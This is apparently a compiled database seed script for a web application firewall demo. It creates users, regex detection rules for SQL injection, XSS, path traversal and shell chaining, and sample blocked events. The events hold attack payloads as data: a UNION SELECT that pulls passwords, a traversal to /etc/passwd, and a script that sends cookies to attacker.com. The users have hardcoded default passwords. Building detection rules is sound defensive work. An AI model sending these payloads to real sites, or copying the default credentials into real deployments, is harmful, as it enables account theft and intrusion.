"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const bcryptjs_1 = __importDefault(require("bcryptjs"));
const prisma = new client_1.PrismaClient();
async function main() {
    console.log('[Sentinel WAF Seed] Starting database initialization...');
    // 1. Users
    const adminPasswordHash = await bcryptjs_1.default.hash('AdminPass123!', 10);
    const analystPasswordHash = await bcryptjs_1.default.hash('AnalystPass123!', 10);
    const admin = await prisma.user.upsert({
        where: { email: 'admin@sentinel.local' },
        update: {},
        create: {
            email: 'admin@sentinel.local',
            name: 'Security Administrator',
            passwordHash: adminPasswordHash,
            role: 'ADMIN',
        },
    });
    await prisma.user.upsert({
        where: { email: 'analyst@sentinel.local' },
        update: {},
        create: {
            email: 'analyst@sentinel.local',
            name: 'Security Analyst',
            passwordHash: analystPasswordHash,
            role: 'ANALYST',
        },
    });
    console.log(`[Seed] Initialized Admin (${admin.email}) and Analyst user.`);
    // 2. System Settings
    await prisma.systemSetting.upsert({
        where: { key: 'WAF_MODE' },
        update: { value: 'PREVENTION' },
        create: { key: 'WAF_MODE', value: 'PREVENTION', description: 'Global WAF Operating Mode (PREVENTION, DETECTION, DISABLED)' },
    });
    await prisma.systemSetting.upsert({
        where: { key: 'DEFAULT_SECURITY_HEADERS' },
        update: { value: 'true' },
        create: { key: 'DEFAULT_SECURITY_HEADERS', value: 'true', description: 'Inject Security Headers (HSTS, CSP, X-Frame-Options)' },
    });
    // 3. Protected Application
    const defaultApp = await prisma.protectedApp.upsert({
        where: { appId: 'app-web-store' },
        update: {},
        create: {
            appId: 'app-web-store',
            name: 'E-Commerce Target App',
            host: 'localhost',
            upstreamUrl: 'http://localhost:5001',
            enabled: true,
            wafMode: 'INHERIT',
            requestLimit: 200,
            healthStatus: 'HEALTHY',
        },
    });
    console.log(`[Seed] Registered Protected Application: ${defaultApp.name}`);
    // 4. WAF Rules
    const defaultRules = [
        {
            ruleId: 'R-SQLI-001',
            name: 'SQL Injection - UNION Select Signature',
            description: 'Detects UNION-based SQL Injection attempts in query parameters and request bodies.',
            category: 'SQLI',
            severity: 'CRITICAL',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(?i)(union\\s+all\\s+select|union\\s+select)',
        },
        {
            ruleId: 'R-SQLI-002',
            name: 'SQL Injection - Boolean Tautology (OR 1=1)',
            description: 'Detects boolean tautology expressions commonly used in authentication bypass attacks.',
            category: 'SQLI',
            severity: 'HIGH',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: "(?i)('\\s*(or|and)\\s+['\"0-9a-z]+\\s*=\\s*['\"0-9a-z]+|'\\s*or\\s*1\\s*=\\s*1)",
        },
        {
            ruleId: 'R-SQLI-003',
            name: 'SQL Injection - Stacked Commands & System Schema',
            description: 'Detects stacked queries e.g. ; DROP TABLE or information_schema probes.',
            category: 'SQLI',
            severity: 'CRITICAL',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'BODY',
            pattern: '(?i)(;\\s*drop\\s+table|;\\s*exec\\(|information_schema|sysdatabases|pg_sleep\\()',
        },
        {
            ruleId: 'R-XSS-001',
            name: 'XSS - Script Tag Injection',
            description: 'Detects explicit <script> HTML tag injections.',
            category: 'XSS',
            severity: 'CRITICAL',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(?i)(<script[^>]*>|%3Cscript%3E)',
        },
        {
            ruleId: 'R-XSS-002',
            name: 'XSS - Inline Event Handler Attributes',
            description: 'Detects inline DOM event handlers e.g. onerror=, onload=, onclick=.',
            category: 'XSS',
            severity: 'HIGH',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(?i)(on(load|error|click|mouseover|submit)\\s*=)',
        },
        {
            ruleId: 'R-XSS-003',
            name: 'XSS - JavaScript Pseudo Protocol',
            description: 'Detects javascript: or data: URIs in input fields.',
            category: 'XSS',
            severity: 'HIGH',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(?i)(javascript\\s*:|data\\s*:\\s*text/html)',
        },
        {
            ruleId: 'R-LFI-001',
            name: 'Path Traversal - Directory Traversal Sequences',
            description: 'Detects ../ and URL encoded path traversal sequences.',
            category: 'LFI',
            severity: 'HIGH',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'PATH',
            pattern: '(\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e/)',
        },
        {
            ruleId: 'R-LFI-002',
            name: 'LFI - Sensitive System File Probe',
            description: 'Detects direct access probes targeting /etc/passwd or system32 files.',
            category: 'LFI',
            severity: 'CRITICAL',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(?i)(/etc/passwd|/etc/shadow|c:\\\\windows\\\\system32|boot.ini|proc/self/environ)',
        },
        {
            ruleId: 'R-REMOTE-001',
            name: 'Unauthorized Remote Access - Admin Probe',
            description: 'Detects unauthorized scanning of internal administrative or git routes.',
            category: 'REMOTE_ACCESS',
            severity: 'MEDIUM',
            enabled: true,
            action: 'LOG',
            matchType: 'REGEX',
            targetField: 'PATH',
            pattern: '(?i)^/(admin|server-status|actuator|wp-admin|\\.env|\\.git/config)',
        },
        {
            ruleId: 'R-MALFORMED-001',
            name: 'Command Injection - OS Shell Operators',
            description: 'Detects OS command injection shell chaining metacharacters.',
            category: 'MALFORMED',
            severity: 'CRITICAL',
            enabled: true,
            action: 'BLOCK',
            matchType: 'REGEX',
            targetField: 'FULL_URL',
            pattern: '(\\|\\||&&|;\\s*cat\\s+|;\\s*ls\\s+|;\\s*ping\\s+)',
        }
    ];
    for (const r of defaultRules) {
        await prisma.wafRule.upsert({
            where: { ruleId: r.ruleId },
            update: r,
            create: r,
        });
    }
    console.log(`[Seed] Initialized ${defaultRules.length} default WAF signatures.`);
    // 5. Rate Limit Policies
    await prisma.rateLimitPolicy.upsert({
        where: { id: 'default-global-limit' },
        update: {},
        create: {
            id: 'default-global-limit',
            name: 'Global IP Rate Limit',
            scope: 'GLOBAL',
            pathPattern: '*',
            windowMs: 60000,
            maxRequests: 100,
            burstLimit: 20,
            action: 'RATE_LIMIT',
            enabled: true,
        },
    });
    // 6. IP Access Rules (Sample Whitelist and Blacklist)
    await prisma.ipAccessRule.upsert({
        where: { ipOrCidr: '198.51.100.45' },
        update: {},
        create: {
            ipOrCidr: '198.51.100.45',
            ipVersion: 'IPv4',
            type: 'BLOCK',
            description: 'Malicious Automated Scanner Network',
            reason: 'Known threat actor source IP',
        }
    });
    await prisma.ipAccessRule.upsert({
        where: { ipOrCidr: '192.168.1.0/24' },
        update: {},
        create: {
            ipOrCidr: '192.168.1.0/24',
            ipVersion: 'IPv4',
            type: 'ALLOW',
            description: 'Trusted Internal Management Subnet',
            reason: 'Internal corporate network CIDR block',
        }
    });
    // 7. Initial Demo Events & Traffic Logs for visual dashboard richness
    const sampleEvents = [
        {
            correlationId: 'req-sqli-demo-001',
            clientIp: '198.51.100.45',
            ipVersion: 'IPv4',
            method: 'GET',
            path: '/api/search',
            appId: defaultApp.id,
            status: 403,
            matchedRuleId: 'R-SQLI-001',
            category: 'SQLI',
            severity: 'CRITICAL',
            decision: 'BLOCK',
            explanation: '[PREVENTION MODE] Detected UNION SQL Injection payload in URL query or body.',
            durationMs: 4.2,
            queryParams: JSON.stringify({ q: "1' UNION SELECT username, password FROM users--" }),
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            timestamp: new Date(Date.now() - 5 * 60 * 1000),
        },
        {
            correlationId: 'req-xss-demo-002',
            clientIp: '203.0.113.88',
            ipVersion: 'IPv4',
            method: 'POST',
            path: '/api/comments',
            appId: defaultApp.id,
            status: 403,
            matchedRuleId: 'R-XSS-001',
            category: 'XSS',
            severity: 'CRITICAL',
            decision: 'BLOCK',
            explanation: '[PREVENTION MODE] Detected <script> tag HTML/Script injection.',
            durationMs: 3.8,
            requestBody: JSON.stringify({ comment: "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>" }),
            userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
            timestamp: new Date(Date.now() - 15 * 60 * 1000),
        },
        {
            correlationId: 'req-lfi-demo-003',
            clientIp: '192.0.2.14',
            ipVersion: 'IPv4',
            method: 'GET',
            path: '/api/download',
            appId: defaultApp.id,
            status: 403,
            matchedRuleId: 'R-LFI-001',
            category: 'LFI',
            severity: 'HIGH',
            decision: 'BLOCK',
            explanation: '[PREVENTION MODE] Detected directory traversal sequence (../).',
            durationMs: 2.9,
            queryParams: JSON.stringify({ file: '../../../../etc/passwd' }),
            userAgent: 'python-requests/2.28.1',
            timestamp: new Date(Date.now() - 45 * 60 * 1000),
        }
    ];
    for (const e of sampleEvents) {
        await prisma.securityEvent.create({ data: e });
        await prisma.trafficLog.create({
            data: {
                correlationId: e.correlationId,
                clientIp: e.clientIp,
                method: e.method,
                path: e.path,
                statusCode: e.status,
                durationMs: e.durationMs,
                decision: e.decision,
                appId: defaultApp.id,
                timestamp: e.timestamp,
            }
        });
    }
    console.log('[Sentinel WAF Seed] Database seeding completed successfully!');
}
main()
    .catch((e) => {
    console.error(e);
    process.exit(1);
})
    .finally(async () => {
    await prisma.$disconnect();
});
